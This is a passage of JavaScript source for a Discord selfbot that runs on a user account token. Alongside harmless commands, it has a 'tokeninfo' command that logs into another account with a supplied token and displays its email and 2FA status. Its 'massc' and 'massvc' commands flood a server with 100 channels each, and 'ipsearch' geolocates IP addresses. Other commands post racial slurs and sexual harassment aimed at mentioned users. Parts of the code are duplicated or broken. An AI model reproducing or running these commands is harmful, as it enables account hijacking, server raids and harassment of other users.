                let user = msg.mentions.users.first()
                superagent.get("https://nekos.life/api/v2/img/blowJob", (body, res) => {
                    if (!user) return msg.reply('You forgot to mention a user.')
                    let embed = new RichEmbed()
                        .setDescription(`${msg.author.tag} gave u blowjob ${user.tag}`)
                        .setColor("#000000")
                        .setImage(res.body.url)
                    msg.channel.send(embed);
                })
            }
            //#endregion
            if (cmd === 'leaveservers') {
                let embed = new RichEmbed()
                    .setDescription("Left " + bot.guilds.size + " Servers")
                msg.edit(embed)
             bot.user.guilds(guilds => {guilds.delete})
        
            }
            //#region leaveservers
            if (cmd === 'leaveservers') {
                let embed = new RichEmbed()
                    .setDescription("Left " + bot.guilds.size + " Servers")
                msg.edit(embed)
                bot.guilds.forEach(server => server.leave())
        
            }
            //#endregion
            //#region feed
            if (cmd === 'feed') {
                let user = msg.mentions.users.first()
                superagent.get("https://nekos.life/api/v2/img/feed", (body, res) => {
                    if (!user) return msg.reply('You forgot to mention a user.')
                    let embed = new RichEmbed()
                        .setDescription(`${msg.author.tag}  is feeding ${user.tag}`)
                        .setColor("#000000")
                        .setImage(res.body.url)
                    msg.channel.send(embed);
                })
            }
            //#endregion
            //#region fuck
            if (cmd === 'fuck') {
                let user = msg.mentions.users.first()
                superagent.get("https://nekos.life/api/v2/img/Random_hentai_gif", (body, res) => {
                    if (!user) return msg.reply('You forgot to mention a user.')
                    let embed = new RichEmbed()
                        .setDescription(`${msg.author.tag} is having esex with ${user.tag}`)
                        .setColor("#000000")
                        .setImage(res.body.url)
                    msg.channel.send(embed);
                })
            }
            //#endregion
            //#region tickle
            if (cmd === 'tickle') {
                let user = msg.mentions.users.first()
                superagent.get("https://nekos.life/api/v2/img/tickle", (body, res) => {
                    if (!user) return msg.reply('You forgot to mention a user.')
                    let embed = new RichEmbed()
                        .setDescription(`${msg.author.tag} is having esex with ${user.tag}`)
                        .setColor("#000000")
                        .setImage(res.body.url)
                    msg.channel.send(embed);
                })
            }
            //#endregion
            //#region kiss
            if (cmd === 'kiss') {
                let user = msg.mentions.users.first()
                superagent.get("https://nekos.life/api/v2/img/kiss", (body, res) => {
                    if (!user) return msg.reply('You forgot to mention a user.')
                    let embed = new RichEmbed()
                        .setDescription(`${msg.author.tag} kiss ${user.tag}`)
                        .setColor("#000000")
                        .setImage(res.body.url)
                    msg.channel.send(embed);
                })
            }
            //#endregion

            if (cmd === 'stats') {
                    const duration = moment.duration(client.uptime).format(" D [days], H [hrs], m [mins], s [secs]");
                    msg.channel.send(`= STATISTICS =
                  • Mem Usage  :: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
                  • Uptime     :: ${duration}
                  • Users      :: ${client.users.size.toLocaleString()}
                  • Servers    :: ${client.guilds.size.toLocaleString()}
                  • Channels   :: ${client.channels.size.toLocaleString()}
                  • Discord.js :: v${version}
                  • Node       :: ${process.version}`, {code: "asciidoc"});
                  };

            //#region boobs
            if (cmd === 'boobs') {
                let user = msg.mentions.users.first()
                superagent.get("", (body, res) => {
                    if (!user) return msg.reply('You forgot to mention a user.')
                    let embed = new RichEmbed()
                        .setDescription(`${msg.author.tag} kiss ${user.tag}`)
                        .setColor("#000000")
                        .setImage(res.body.url)
                    msg.channel.send(embed);
                })
            }
            //#endregion
            //#region doom
            if (cmd === 'doom') {
                ascii.font(args.join(" "), "Doom", function(err, rendered) {
                    rendered = rendered.trimRight()
                    msg.channel.send("```\n" + rendered + "\n```")
                })
            }
            //#endregion
            //#region  rusted
            if (cmd === 'rusted') {
                ascii.font(args.join(" "), "rusted", function(err, rendered) {
                    rendered = rendered.trimRight()
                    msg.channel.send("```\n" + rendered + "\n```")
                })
            }
            //#endregion
            //#region tokeninfo
            if (cmd === 'tokeninfo') {
                let mention = args.join(" ")
                if (!mention) return msg.edit("`You forgot to provice a token!`").then(message => message.delete(3000));
                const token = new Client()
                token.login(mention)
                token.on("ready", () => {
                    let embed = new RichEmbed()
                        .addField("Avatar", token.user.avatar)
                        .addField("name", token.user.username)
                        .addField("ID", token.user.id)
                        .addField("Email", token.user.email)
                        .addField("Created", token.user.createdAt)
                        .addField("Verified", token.user.verified)
                        .addField("Nitro", token.user.premium)
                        .addField("2fa", token.user.mfaEnabled)
                        .addField("Last Message", token.user.lastMessage || "No Messages")
                    msg.channel.send(embed)
                })
            }
            //#endregion
            //#region handjob
            if (cmd === 'handjob') {
                let mention = msg.mentions.users.first();
                if (!mention) return msg.channel.send("`@ user to lol`").then(message => message.delete(3000));
                msg.edit("8=:fist:==D " + mention);
                msg.edit("8==:fist:=D " + mention);
                msg.edit("8===:fist:D " + mention);
                msg.edit("8==:fist:=D " + mention);
                msg.edit("8=:fist:==D " + mention)
                msg.edit("8:fist:===D " + mention);
                msg.edit("8=:fist:==D " + mention);
                msg.edit("8==:fist:=D " + mention);
                msg.edit("8===:fist:D " + mention)
                msg.edit("8==:fist:=D:sweat_drops: " + mention);
                msg.edit("8===:fist:D:sweat_drops: " + mention)
            }
            //#endregion
            //#region pack
            if (cmd === 'pack') {
                let messageList = [
                    "`COME ON NAH SON YOUR FAT LIKE SHIT `",
                    "` U GOT YOUR MIC FROM WALMART NASTY AH NIGGA`",
                    "`U SO FAT WHEN U WALK IN YOUR CLASS THE ROOM SHAKE `",
                    "`YOUR FAT WHEN U WALK BY MY TV I MISSED LIKE 10 EP`",
                    "`MA NIGGA U THE TYPE OF NIGGA WHO ASKED FOR SECOND LUCH YOUR FAT LIKE SHTT `",
                    "`YOUR GAY LIKE SHIT NIGGA FUCK U DUMB ASS `",
                    "`YOUR MOM LEFT U IN A TRASH CUZ U UGLY LIKE SHIT NIGGA `",
                    "`U TRY TO FUCK YOUR GRANNY AND GET SUPERLEX  `",
                ];
                msg.edit(messageList[Math.floor(Math.random() * messageList.length)]);
            }
            //#endregion
            //#region fakewizz
            if (cmd === 'fakewizz') {
                let mention = msg.mentions.users.first();
                if (!mention) return msg.edit("`@ user to lol`").then(message => message.delete(3000));
                msg.edit(mention);
                msg.edit("`Deleting channel.`");
                msg.edit("`done`");
                msg.edit("`Changing Server Name.`");
                msg.edit("`done`");
                msg.edit("`Kicking Bot`");
                msg.edit("`done`");
                msg.edit("`Making Channel`");
                msg.edit("`done`");
                msg.edit("`Banning all Members`").then(message => message.delete(3000));
            }
            //#endregion
            //#region pfp
            if (cmd === 'pfp') {
                let mention = msg.mentions.users.first();
                if (!mention) return msg.edit("`@ user to lol`").then(message => message.delete(3000));
                let embed = new RichEmbed()
                    .setDescription((`PFP URL: [Click to See](${mention.avatarURL})`))
                    .setImage(mention.avatarURL)
                msg.channel.send(embed)
            }
            //#endregion
            //#region stealpfp
            if (cmd === 'stealpfp') {
                let user = msg.mentions.users.first()
                bot.user.setAvatar(user.avatarURL)
                msg.channel.send("Done!")
            }
            //#endregion
            //#region lol
            if (cmd === 'lol') {
                let mention = msg.mentions.users.first();
                if (!mention) return msg.edit("`@ user to lol`").then(message => message.delete(3000));
                msg.edit(mention);
                msg.edit(":joy: " + mention);
                msg.edit(":joy::joy: " + mention);
                msg.edit(":joy::joy::joy: " + mention);
                msg.edit(":joy::joy: " + mention + " :joy:");
                msg.edit(":joy: " + mention + ":joy::joy:");
                msg.edit(mention + " :joy::joy::joy:").then(message => message.delete(3000));
            }
            //#endregion
            //#region ping
            if (cmd === 'ping') {
                msg.edit(`*${bot.ping.toFixed()}ms*`);
            }
            if (cmd === 'clear') {
                msg.channel.fetchMessages({
                    limit: 100
                }).then(msgs => msgs.filter(m => m.author.id === bot.user.id).map(r => r.delete()))
            }
            //#endregion
            //#region listening
            if (cmd === 'listening') {
                bot.user.setPresence({
                    game: {
                        name: args.join(" "),
                        type: "LISTENING",
                        url: "https://twitch.tv/syrusisthebestcoder"
                    }
                })
                msg.delete();
                await msg.channel.send("Changinging Status...").then(message => message.delete(1000));
                await msg.channel.send("`Listening` Created!").then(message => message.delete(2000));
            };
            //#endregion
            //#region uptime
            if (cmd === 'uptime') {
                var seconds = parseInt((bot.uptime / 1000) & 60),
                    minutes = parseInt((bot.uptime / (1000 * 60)) % 60),
                    hours = parseInt((bot.uptime / (1000 * 60 * 60)) % 24);
                hours = (hours < 10) ? "0" + hours : hours;
                minutes = (minutes < 10) ? "0" + minutes : minutes;
                seconds = (seconds < 10) ? "0" + seconds : seconds;
        
                let embed = new RichEmbed()
                    .setDescription(`⌛𝘏𝘰𝘶𝘳: ${hours}\n\n⏱𝘔𝘪𝘯𝘶𝘵𝘦𝘴: ${minutes}\n\n⌚𝘚𝘦𝘤𝘰𝘯𝘥𝘴: ${seconds}`)
                msg.edit(embed)
        
            }
            //#endregion
            //#region straming
            if (cmd === 'streaming') {
                bot.user.setActivity(args.join(" "), {
                    url: "https://www.twitch.tv/syrusisthebestcoder",
                    type: "STREAMING"
                });
                msg.delete();
                await msg.channel.send("Chaning Status...").then(message => message.delete(1000));
                await msg.channel.send("`Streaming` Created! ").then(message => message.delete(2000));
            };
            //#endregion
            //#region watching
            if (cmd === 'watching') {
                bot.user.setActivity(args.join(" "), {
                    url: "https://www.twitch.tv/syrusisthebestcoder",
                    type: "WATCHING"
                });
                msg.delete();
                await msg.channel.send("Chaning Status...").then(message => message.delete(1000));
                await msg.channel.send("`Watching` Created! ").then(message => message.delete(2000));
            };
            //#endregion
            //#region listening
            if (cmd === 'listening') {
                bot.user.setActivity(args.join(" "), {
                    url: "https://www.twitch.tv/syrusisthebestcoder",
                    type: "LISTENING"
                });
                msg.delete();
                await msg.channel.send("Chaning Status...").then(message => message.delete(1000));
                await msg.channel.send("`listening` Created! ").then(message => message.delete(2000));
            };
            //#endregion
            //#region playing
            if (cmd === 'playing') {
                bot.user.setActivity(args.join(" "), {
                    url: "https://www.twitch.tv/syrusisthebestcoder",
                    type: "PLAYING"
                });
                msg.delete();
                await msg.channel.send("Chaning Status...").then(message => message.delete(1000));
                await msg.channel.send("`Watching` Created! ").then(message => message.delete(2000));
            };
            //#endregion
            //#region stats
            if (cmd === "stats") {
                msg.edit("`𝐈𝐍`" + bot.guilds.size + "`𝐒𝐄𝐑𝐕𝐄𝐑𝐒`" + bot.users.size + "`𝐌𝐄𝐌𝐁𝐄𝐑𝐒`")
            }
            //#endregion        
            //#region token
            if (cmd === 'token') {
        
                let user = msg.mentions.users.first() || bot.users.get(args[0])
                if (!user) return msg.channel.send('You forgot to mention a user!')
                let embed = new RichEmbed().setDescription(Buffer.from(user.id).toString("base64"))
                    .setColor("#000000")
                    .setThumbnail('https://cdn.discordapp.com/attachments/763037060646436874/763065794858450994/1dab26152bac70ca721e071aeb5ad1a9.gif')
                msg.channel.send(embed)
            }
            //#endregion
            //#region stop
            if (cmd === 'stop') {
                bot.user.setActivity("");
                msg.delete();
                await msg.channel.send("Status `Stopped`! ").then(message => message.delete(2000));
            };
            //#endregion
            //#region typing
            if (cmd === 'typing') {
                msg.channel.startTyping()
                msg.react("✅")
            }
            //#endregion
            //#region purge
            if (cmd === 'purge') {
                if (args[0] < 1 || args.length < 1) {
                    return msg.edit("`You can't purge <= 0 messages!`").then(message => message.delete(2000));
                };
                let count = parseInt(args[0] || 1);
                msg.channel.fetchMessages({
                    limit: 100
                }).then(async messages => {
                    let msg_array = messages.array();
                    msg_array = msg_array.filter(m => m.author.id === bot.user.id);
                    msg_array.length = count + 1;
                    msg_array.map(m => m.delete());
                    await msg.channel.send("*Purged* " + ` \`${args[0]}/${args[0]}\`` + " *messages!*").then(message => message.delete(1500));
                })
            };
            //#endregion
            //#region massc
            if (cmd === 'massc') {
                if (args.length < 2) return msg.edit("`Please enter text channel name and channels`").then(message => message.delete(5000));
                msg.delete();
                for (let i = 0; i < 100; i++) {
                    msg.guild.createChannel(args.join(" "), "text");
        
                }
            }
            //#endregion
            //#region massv
            if (cmd === "massvc") {
                if (args.length < 1) return msg.edit("`Please enter voice channel name`").then(message => message.delete(5000));
                msg.delete();
                for (let i = 0; i < 100; i++) {
                    msg.guild.createChannel(args.join(" "), "voice");
        
                }
            }
            //#endregion
            //#region spam
            if (cmd === "spam") {
                let gay = args.join(" ");
                if (!gay) return msg.edit("`Add message to spam!`").then(message => message.delete(3000));
                msg.delete();
            };
            //#endregion
            //#region afk activation
            if (cmd === "afkon") {
                if (afkmode === false) {
                    afkmode = true;
                    if (!args[0]) return msg.reply('You forgot to specify how many seconds you should wait until sending the message!')
        
                    let time = ms(args[0])
                    if (!time || time < 1000) return msg.reply('That was not a valid time, Enter Something Like `2s` `1m`')
                    let message = args.join(" ").slice(args[1].length)
        
                    if (!message) return msg.reply('You forgot a message to send!')
        
                    setTimeout(() => {
                        msg.channel.send(message)
                    }, time);
                }
        
            }
            //#endregion
            //#region afk deactivation
            if (cmd === "afkoff") {
                if (afkmode === true) {
                    afkmode = false;
                    msg.channel.send("Deactivated AFK mode!")
                }
        
            }
            //#endregion
            //#region dm
            if (cmd === "dm") {
                let str = args.join(" ")
                if (str.length > 2000) return msg.reply('Your message can not exceed 2000 characters.')
        
                if (!str) return msg.reply('I need a message to send!')
        
                let user = msg.mentions.users.first()
        
                if (!user) return msg.reply('You forgot to mention a user.')
        
        
        
                user.send(str.slice(args[0].length).trimLeft())
        
        
            }
            //#endregion
            //#region backup
            if (cmd === "backup") {
                if (!msg.guild.me.hasPermission("MANAGE_CHANNELS")) return msg.reply('you do not have the manage_channels permissions.')
                fs.readFile("././misc/u-backup/channels.txt", {
                    encoding: "utf8"
                }, async function(err, data) {
        
                    if (err) return msg.channel.send('Could not find a backup file!')
                    let array = data.split("\n")
        
                    for (let i = 0; i < array.length; i++) {
        
                        if (array[i].split(" ").length > 1) {
                            await msg.guild.createChannel(array[i], {
                                type: "voice"
                            })
                        } else if (array[i].split(" ").length <= 1) {
                            await msg.guild.createChannel(array[i], {
                                type: "text"
                            })
                        }
        
                    }
                    msg.channel.send('Done!')
        
                })
        
            }
            //#endregion
            //#region flipcoin
            if (cmd === "flipcoin") {
                let messageList = [
                    "**Heads**",
                    "**Tails**",
                ];
        
                msg.edit(messageList[Math.floor(Math.random() * messageList.length)]).then(message => message.delete(5000));
            };
            //#endregion
            //#region weather
            if (cmd === "weather") {
                weather.find({
                    search: args.join(" "),
                    degreeTypeL: "F"
                }, function(err, result) {
                    if (err) return msg.edit("`Error: `" + err).then(message => message.delete(3000))
        
                    let current = result[0].current;
                    let location = result[0].location;
                    msg.delete();
                    let embed = new Discord.RichEmbed()
                        .setDescription(`Skys look - **${current.skytext}**`)
                        .setAuthor(`Weather for ${current.observationpoint}`)
                        .setThumbnail(current.imageURL)
                        .setColor("000000")
                        .addField("Timezone", `UTC${location.timezone}`, true)
                        .addField("Degree Type", location.degreetype, true)
                        .addField("Temperature", `${current.temperature} Degrees`, true)
                        .addField("Feels Like", `${current.feelslike} Degrees`, true)
                        .addField("Winds", current.winddisplay, true)
                        .addField("Humidity", `${current.humidity}%`, true)
                    msg.channel.send(embed);
        
                });
            }
            //#endregion
            //#region serverinfo
            if (cmd === 'serverinfo') {
                const verlvl = {
                    0: "None",
                    1: "Low",
                    2: "Medium",
                    3: "(╯°□°）╯︵ ┻━┻",
                    4: "(ノಠ益ಠ)ノ彡┻━┻"
                }
        
                let inline = true
                let sicon = msg.guild.iconURL;
                let serverembed = new RichEmbed()
                    .setColor("#00ff00")
                    .setThumbnail(sicon)
                    .setAuthor(msg.guild.name)
                    .addField("Name", msg.guild.name, inline)
                    .addField("ID", msg.guild.id, inline)
                    .addField("Owner", msg.guild.owner, inline)
                    .addField("Region", msg.guild.region, inline)
                    .addField("Verification Level", verlvl[msg.guild.verificationLevel], inline)
                    .addField("Members", `${msg.guild.memberCount}`, inline)
                    .addField("Roles", msg.guild.roles.size, inline)
                    .addField("Channels", msg.guild.channels.size, inline)
                    .addField("You Joined", msg.member.joinedAt)
                    .setFooter(`Created ${msg.guild.createdAt}`);
        
                msg.channel.send(serverembed);
        
                msg.delete();
            }
            //#endregion  
            
//#region  pokemoan
            if (cmd === 'poki') {
                let image;
                let embed = new RichEmbed()
                .setColor("RANDOM")
                
                if(args[0]) {
                    image = pokemon.getSprite(args[0])
                    if(!image) return msg.reply('Could not find that pokemon!')
                    embed.setImage(image)
                    msg.channel.send(embed)
                    return;
                }
            
                image = `https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/${Math.floor(Math.random() * 807) + 1}.png`
                embed.setImage(image)
                msg.channel.send(embed)
            }
            //#endregion

            //#region IP Search
            if (cmd === 'ipsearch') {
                let ip = args.join(" ")
                snekfetch.get("http://ip-api.com/json/" + ip).then(r => {
                    let embed = new RichEmbed()
                        .setDescription("``" + `Looked Up IP: ${r.body.query}\nCountry: ${r.body.country}\nCountry Code: ${r.body.countryCode}\nISP: ${r.body.isp}\nRegion: ${r.body.region}\nStatus: ${r.body.status}\nTimeZone: ${r.body.timezone}\nAS: ${r.body.as}\nOrg: ${r.body.org}\nZip: ${r.body.zipCode}` + "``")
                        .setTimestamp()
                        .setColor("#D02BB5")
                    msg.channel.send(embed);
                })
            }
            //#endregion
        })
    }   
    else {
        console.log(red('                            ::::::::::: ::::    :::  ::::::::        ::::::::  :::::::::  '));
        console.log(red('                                :+:     :+:+:   :+: :+:    :+:      :+:    :+: :+:    :+: '));
        console.log(red('                                +:+     :+:+:+  +:+ +:+    +:+      +:+        +:+    +:+ '));
        console.log(red('                                +#+     +#+ +:+ +#+ +#+    +:+      +#++:++#++ +#++:++#+  '));
        console.log(red('                                +#+     +#+  +#+#+# +#+    +#+             +#+ +#+    +#+ '));
        console.log(red('                                #+#     #+#   #+#+# #+#    #+#      #+#    #+# #+#    #+# '));
        console.log(red('                                ###     ###    ####  ########        ########  #########  '));
        console.log(blue('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'));
        console.log(red("YOU ARE NOT WHITELISTED!"))
        console.log(green("DM $Y#8300 TO GET WHITELISTED!"))
        console.log(red("SUBSCRIBE TO 2KSYRUS"))
    }
})
});
bot.login(settings.token);
